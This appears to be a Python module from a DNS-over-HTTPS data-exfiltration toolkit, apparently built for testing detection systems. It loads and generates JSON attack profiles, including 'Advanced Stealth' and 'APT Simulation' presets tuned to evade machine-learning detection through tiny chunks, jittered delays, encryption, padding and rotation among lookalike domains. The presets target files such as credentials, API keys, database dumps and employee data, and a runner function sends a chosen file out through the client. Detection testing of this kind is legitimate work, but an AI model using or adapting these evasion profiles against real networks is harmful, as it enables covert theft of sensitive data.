#!/usr/bin/env python3
"""
JSON Configuration Loader for DoH Exfiltration

Configuration loading system for JSON files to facilitate evasion testing
and allow flexible configuration of exfiltration parameters.
"""

import json
import os
import logging
from typing import Dict, Any, Optional, List
from pathlib import Path
from dataclasses import asdict
from client import ExfiltrationConfig, EncodingType, TimingPattern, DoHExfiltrationClient

logger = logging.getLogger(__name__)

class JSONConfigLoader:
    """JSON configuration loader for DoH exfiltration"""
    
    def __init__(self, config_dir: str = "test_configs"):
        self.config_dir = Path(config_dir)
        self.config_dir.mkdir(exist_ok=True)
        
        # Create sample configurations if they don't exist
        self._create_sample_configs()
    
    def load_config_from_file(self, config_path: str) -> Optional[ExfiltrationConfig]:
        """
        Load configuration from a JSON file
        
        Args:
            config_path: Path to the JSON configuration file
            
        Returns:
            ExfiltrationConfig or None if error
        """
        try:
            config_file = Path(config_path)
            if not config_file.exists():
                # Try in the configs directory
                config_file = self.config_dir / config_path
                if not config_file.exists():
                    logger.error(f"Configuration file not found: {config_path}")
                    return None
            
            with open(config_file, 'r', encoding='utf-8') as f:
                config_data = json.load(f)
            exfiltration_config = config_data.get('exfiltration_config', {})

            return self._json_to_config(exfiltration_config)

        except Exception as e:
            logger.error(f"Error loading config from {config_path}: {e}")
            return None
    
    def load_test_scenario(self, scenario_name: str) -> Optional[Dict[str, Any]]:
        """
        Load complete test scenario with configuration and parameters
        
        Args:
            scenario_name: Name of the scenario to load
            
        Returns:
            Dictionary with config, test_files, and metadata
        """
        try:
            scenario_file = self.config_dir / f"{scenario_name}.json"
            if not scenario_file.exists():
                logger.error(f"Scenario not found: {scenario_name}")
                return None
            
            with open(scenario_file, 'r', encoding='utf-8') as f:
                scenario_data = json.load(f)
            
            # Convert configuration
            if 'exfiltration_config' in scenario_data:
                config = self._json_to_config(scenario_data['exfiltration_config'])
                scenario_data['exfiltration_config'] = config
            
            return scenario_data
            
        except Exception as e:
            logger.error(f"Error loading scenario {scenario_name}: {e}")
            return None
    
    def save_config_to_file(self, config: ExfiltrationConfig, filename: str, 
                           metadata: Optional[Dict[str, Any]] = None) -> bool:
        """
        Save configuration to a JSON file
        
        Args:
            config: Configuration to save
            filename: Filename (with or without .json)
            metadata: Additional metadata
            
        Returns:
            True if success, False otherwise
        """
        try:
            if not filename.endswith('.json'):
                filename += '.json'
            
            config_file = self.config_dir / filename
            config_dict = self._config_to_json(config)
            
            if metadata:
                config_dict.update(metadata)
            
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(config_dict, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Configuration saved to: {config_file}")
            return True
            
        except Exception as e:
            logger.error(f"Error saving config to {filename}: {e}")
            return False
    
    def list_available_configs(self) -> List[str]:
        """List all available configurations"""
        config_files = []
        for file in self.config_dir.glob("*.json"):
            config_files.append(file.stem)
        return sorted(config_files)
    
    def validate_config(self, config_data: Dict[str, Any]) -> bool:
        """Validate JSON configuration"""
        required_fields = ['doh_server', 'target_domain', 'chunk_size']
        
        for field in required_fields:
            if field not in config_data:
                logger.error(f"Missing required field: {field}")
                return False
        
        # Validate enumerations
        if 'encoding' in config_data:
            valid_encodings = [e.value for e in EncodingType]
            if config_data['encoding'] not in valid_encodings:
                logger.error(f"Invalid encoding: {config_data['encoding']}")
                return False
        
        if 'timing_pattern' in config_data:
            valid_patterns = [p.value for p in TimingPattern]
            if config_data['timing_pattern'] not in valid_patterns:
                logger.error(f"Invalid timing pattern: {config_data['timing_pattern']}")
                return False
        
        return True
    
    def _json_to_config(self, config_data: Dict[str, Any]) -> ExfiltrationConfig:
        """Convert JSON dictionary to ExfiltrationConfig"""
        # Validate first
        if not self.validate_config(config_data):
            raise ValueError("Invalid configuration data")
        
        # Convert enumerations
        encoding = EncodingType.BASE64
        if 'encoding' in config_data:
            encoding = EncodingType(config_data['encoding'])
        
        timing_pattern = TimingPattern.REGULAR
        if 'timing_pattern' in config_data:
            timing_pattern = TimingPattern(config_data['timing_pattern'])
        
        # Create configuration with default values
        config = ExfiltrationConfig(
            doh_server=config_data.get('doh_server', 'https://doh.local/dns-query'),
            target_domain=config_data.get('target_domain', 'exfill.local'),
            chunk_size=config_data.get('chunk_size', 30),
            encoding=encoding,
            compression=config_data.get('compression', False),
            encryption=config_data.get('encryption', False),
            encryption_key=config_data.get('encryption_key'),
            timing_pattern=timing_pattern,
            base_delay=config_data.get('base_delay', 0.2),
            delay_variance=config_data.get('delay_variance', 0.1),
            burst_size=config_data.get('burst_size', 5),
            burst_delay=config_data.get('burst_delay', 2.0),
            domain_rotation=config_data.get('domain_rotation', False),
            backup_domains=config_data.get('backup_domains', []),
            subdomain_randomization=config_data.get('subdomain_randomization', True),
            padding=config_data.get('padding', False),
            padding_size=config_data.get('padding_size', 10),
            max_retries=config_data.get('max_retries', 3),
            retry_delay=config_data.get('retry_delay', 1.0),
            timeout=config_data.get('timeout', 5.0)
        )
        
        return config
    
    def _config_to_json(self, config: ExfiltrationConfig) -> Dict[str, Any]:
        """Convert ExfiltrationConfig to JSON dictionary"""
        return {
            'doh_server': config.doh_server,
            'target_domain': config.target_domain,
            'chunk_size': config.chunk_size,
            'encoding': config.encoding.value,
            'compression': config.compression,
            'encryption': config.encryption,
            'encryption_key': config.encryption_key,
            'timing_pattern': config.timing_pattern.value,
            'base_delay': config.base_delay,
            'delay_variance': config.delay_variance,
            'burst_size': config.burst_size,
            'burst_delay': config.burst_delay,
            'domain_rotation': config.domain_rotation,
            'backup_domains': config.backup_domains,
            'subdomain_randomization': config.subdomain_randomization,
            'padding': config.padding,
            'padding_size': config.padding_size,
            'max_retries': config.max_retries,
            'retry_delay': config.retry_delay,
            'timeout': config.timeout
        }
    
    def _create_sample_configs(self):
        """Create sample configurations for evasion testing"""
        
        # Classic configuration (easily detectable)
        classic_config = {
            "name": "Classic Exfiltration",
            "description": "Classic easily detectable configuration for basic tests",
            "exfiltration_config": {
                "doh_server": "https://doh.local/dns-query",
                "target_domain": "exfill.local",
                "chunk_size": 40,
                "encoding": "base64",
                "timing_pattern": "regular",
                "base_delay": 0.5,
                "compression": False,
                "encryption": False,
                "subdomain_randomization": False
            },
            "test_files": ["sample.txt", "credentials.json"],
            "detection_expected": True,
            "notes": "Basic configuration for detection system validation"
        }
        
        # Advanced stealth configuration
        stealth_config = {
            "name": "Advanced Stealth",
            "description": "Advanced stealth configuration for ML evasion",
            "exfiltration_config": {
                "doh_server": "https://doh.local/dns-query",
                "target_domain": "cdn-assets.local",
                "chunk_size": 12,
                "encoding": "custom",
                "timing_pattern": "stealth",
                "base_delay": 8.0,
                "delay_variance": 3.0,
                "compression": True,
                "encryption": True,
                "encryption_key": "stealth_key_2024",
                "subdomain_randomization": True,
                "padding": True,
                "padding_size": 15,
                "domain_rotation": True,
                "backup_domains": ["api-service.local", "media-content.local"]
            },
            "test_files": ["database_dump.sql", "api_keys.json"],
            "detection_expected": False,
            "notes": "Advanced evasion techniques: small chunks, variable timing, encryption"
        }
        
        # Fast burst configuration
        burst_config = {
            "name": "Burst Attack",
            "description": "Fast burst attack for temporal detection testing",
            "exfiltration_config": {
                "doh_server": "https://doh.local/dns-query",
                "target_domain": "cache-service.local",
                "chunk_size": 50,
                "encoding": "hex",
                "timing_pattern": "burst",
                "base_delay": 0.02,
                "burst_size": 12,
                "burst_delay": 3.0,
                "compression": True,
                "subdomain_randomization": True,
                "max_retries": 5
            },
            "test_files": ["large_dataset.csv", "backup.zip"],
            "detection_expected": True,
            "notes": "Burst pattern to test temporal anomaly detection"
        }
        
        # APT configuration (long persistence)
        apt_config = {
            "name": "APT Simulation",
            "description": "APT simulation with very slow and discreet exfiltration",
            "exfiltration_config": {
                "doh_server": "https://doh.local/dns-query",
                "target_domain": "update-service.local",
                "chunk_size": 8,
                "encoding": "base32",
                "timing_pattern": "random",
                "base_delay": 30.0,
                "delay_variance": 15.0,
                "compression": True,
                "encryption": True,
                "encryption_key": "apt_long_term_key",
                "subdomain_randomization": True,
                "domain_rotation": True,
                "backup_domains": [
                    "security-updates.local",
                    "maintenance-api.local",
                    "status-check.local"
                ],
                "padding": True,
                "padding_size": 20
            },
            "test_files": ["financial_records.xlsx", "employee_data.csv"],
            "detection_expected": False,
            "notes": "APT simulation: very slow delays, domain rotation, encryption"
        }
        
        # Speed test configuration
        speed_test_config = {
            "name": "Speed Test",
            "description": "Configuration optimized for maximum speed",
            "exfiltration_config": {
                "doh_server": "https://doh.local/dns-query",
                "target_domain": "fast-cdn.local",
                "chunk_size": 60,
                "encoding": "base64",
                "timing_pattern": "burst",
                "base_delay": 0.001,
                "burst_size": 20,
                "burst_delay": 0.1,
                "compression": True,
                "max_retries": 1,
                "retry_delay": 0.05,
                "timeout": 2.0
            },
            "test_files": ["speed_test_file.bin"],
            "detection_expected": True,
            "notes": "Configuration to measure maximum exfiltration speed"
        }
        
        # Save sample configurations
        configs = {
            'classic': classic_config,
            'stealth': stealth_config,
            'burst': burst_config,
            'apt': apt_config,
            'speed': speed_test_config
        }
        
        for name, config in configs.items():
            config_file = self.config_dir / f"{name}.json"
            if not config_file.exists():
                with open(config_file, 'w', encoding='utf-8') as f:
                    json.dump(config, f, indent=2, ensure_ascii=False)
    
    def create_custom_test_config(self, name: str, file_size: int, 
                                target_speed: str = "balanced") -> str:
        """
        Create custom configuration based on file size and target speed
        
        Args:
            name: Configuration name
            file_size: File size in bytes
            target_speed: "fast", "balanced", "stealth"
            
        Returns:
            Name of the created configuration file
        """
        # Parameters based on file size and target speed
        if target_speed == "fast":
            if file_size < 1024:  # < 1KB
                chunk_size = 25
                base_delay = 0.01
                timing = "burst"
                burst_size = 8
            elif file_size < 10240:  # < 10KB
                chunk_size = 40
                base_delay = 0.02
                timing = "burst"
                burst_size = 12
            else:  # > 10KB
                chunk_size = 55
                base_delay = 0.005
                timing = "burst"
                burst_size = 15
            
            compression = True
            encryption = False
            randomization = False
            
        elif target_speed == "stealth":
            if file_size < 1024:  # < 1KB
                chunk_size = 8
                base_delay = 5.0
                delay_variance = 2.0
            elif file_size < 10240:  # < 10KB
                chunk_size = 12
                base_delay = 8.0
                delay_variance = 3.0
            else:  # > 10KB
                chunk_size = 15
                base_delay = 12.0
                delay_variance = 5.0
            
            timing = "stealth"
            compression = True
            encryption = True
            randomization = True
            
        else:  # balanced
            if file_size < 1024:  # < 1KB
                chunk_size = 20
                base_delay = 0.3
            elif file_size < 10240:  # < 10KB
                chunk_size = 30
                base_delay = 0.5
            else:  # > 10KB
                chunk_size = 35
                base_delay = 0.2
            
            timing = "random"
            delay_variance = 0.2
            compression = True
            encryption = True
            randomization = True
        
        # Create configuration
        custom_config = {
            "name": f"Custom {name} ({target_speed})",
            "description": f"Automatic configuration for {file_size} bytes file, {target_speed} speed",
            "generated": True,
            "file_size": file_size,
            "target_speed": target_speed,
            "exfiltration_config": {
                "doh_server": "https://doh.local/dns-query",
                "target_domain": "exfill.local",
                "chunk_size": chunk_size,
                "encoding": "base64",
                "timing_pattern": timing,
                "base_delay": base_delay,
                "compression": compression,
                "encryption": encryption,
                "encryption_key": f"auto_key_{name}" if encryption else None,
                "subdomain_randomization": randomization
            }
        }
        
        # Add specific parameters according to timing
        if timing == "burst":
            custom_config["exfiltration_config"]["burst_size"] = burst_size
            custom_config["exfiltration_config"]["burst_delay"] = 1.0
        elif timing == "stealth":
            custom_config["exfiltration_config"]["delay_variance"] = delay_variance
            custom_config["exfiltration_config"]["padding"] = True
            custom_config["exfiltration_config"]["padding_size"] = 10
        elif timing == "random":
            custom_config["exfiltration_config"]["delay_variance"] = delay_variance
        
        # Save
        filename = f"custom_{name}_{target_speed}.json"
        config_file = self.config_dir / filename
        
        with open(config_file, 'w', encoding='utf-8') as f:
            json.dump(custom_config, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Created custom configuration: {filename}")
        return filename


def run_test_with_config(config_file: str, test_file: str) -> bool:
    """
    Execute exfiltration test with JSON configuration
    
    Args:
        config_file: Path to JSON configuration file
        test_file: File to exfiltrate
        
    Returns:
        True if success, False otherwise
    """
    try:
        # Load configuration
        loader = JSONConfigLoader()
        scenario = loader.load_test_scenario(config_file.replace('.json', ''))
        
        if not scenario:
            logger.error(f"Failed to load scenario: {config_file}")
            return False
        
        config = scenario['exfiltration_config']
        
        # Create client and execute
        client = DoHExfiltrationClient(config)
        
        logger.info(f"Starting exfiltration with config: {scenario['name']}")
        logger.info(f"File: {test_file}")
        logger.info(f"Description: {scenario['description']}")
        
        success = client.exfiltrate_file(test_file)
        
        if success:
            logger.info("Exfiltration completed successfully")
        else:
            logger.error("Exfiltration failed")
        
        return success
        
    except Exception as e:
        logger.error(f"Error running test: {e}")
        return False


def main():
    """JSON configuration loader demonstration"""
    print("JSON Configuration Loader for DoH Exfiltration")
    print("=" * 60)
    
    # Configure logging
    logging.basicConfig(level=logging.INFO, 
                       format='%(asctime)s - %(levelname)s - %(message)s')
    
    # Create loader
    loader = JSONConfigLoader()
    
    # List available configurations
    configs = loader.list_available_configs()
    print(f"\nAvailable configurations: {len(configs)}")
    for config in configs:
        print(f"   • {config}.json")
    
    # Test configuration loading
    print(f"\nTesting configuration loading...")
    test_config = loader.load_config_from_file('classic.json')
    if test_config:
        print(f"Loaded classic config:")
        print(f"   - Chunk size: {test_config.chunk_size}")
        print(f"   - Encoding: {test_config.encoding.value}")
        print(f"   - Timing: {test_config.timing_pattern.value}")
    
    # Create custom configuration
    print(f"\nCreating custom configuration...")
    custom_file = loader.create_custom_test_config("demo", 5000, "balanced")
    print(f"Created: {custom_file}")
    
    # Test full scenario loading
    print(f"\nTesting full scenario loading...")
    scenario = loader.load_test_scenario('stealth')
    if scenario:
        print(f"Loaded stealth scenario:")
        print(f"   - Name: {scenario['name']}")
        print(f"   - Description: {scenario['description']}")
        print(f"   - Detection expected: {scenario['detection_expected']}")
    
    print(f"\nUsage examples:")
    print(f"   python json_config_loader.py")
    print(f"   python quick_test.py --config stealth.json file.txt")
    print(f"   python client.py --json-config custom_demo_balanced.json")


if __name__ == "__main__":
    main()
